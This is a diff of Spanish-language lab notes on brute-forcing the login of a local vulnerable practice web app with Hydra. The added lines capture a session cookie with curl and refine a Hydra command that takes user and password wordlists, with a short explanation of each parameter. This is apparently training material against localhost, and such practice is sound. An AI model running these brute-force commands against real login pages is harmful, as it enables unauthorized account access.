@@ -1,7 +1,18 @@
+El primer paso es sacar la coockie que vamos a implementar en nuestro ataque, para ello hacemos los siguientes comandos:
+
+    curl -c cookies.txt http://127.0.0.1/login.php
+
+    curl -X POST -b cookies.txt -c cookies.txt -d "username=admin&password=password&Login=Login" http://127.0.0.1/login.php
+
+    cat cookies.txt
+
+    
 En este apartado, vamos a realizar un ataque de fuerza bruta para conseguir acceso a nuestra página web vulnerable, haciendo uso de hidra junto a un par de wordlists con posibles nombres de usuarios y contraseñas filtradas. Para ello vamos a implementar el siguiente comando:
 
 
-    hydra -L /home/ubuntu/Desktop/credentials/users.txt admin -P /home/ubuntu/Desktop/credentials/passwds.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
+    hydra -L /home/ubuntu/Desktop/credentials/users.txt -P /home/ubuntu/Desktop/credentials/passwds.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
+
+"/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=result=success"
 
 
 hydra
@@ -42,3 +53,6 @@ username=^USER^&password=^PASS^&Login=Login
     
         security=medium 
             Establece un nivel de seguridad en la plataforma de pruebas (posiblemente DVWA, Damn Vulnerable Web Application).
+
+
+
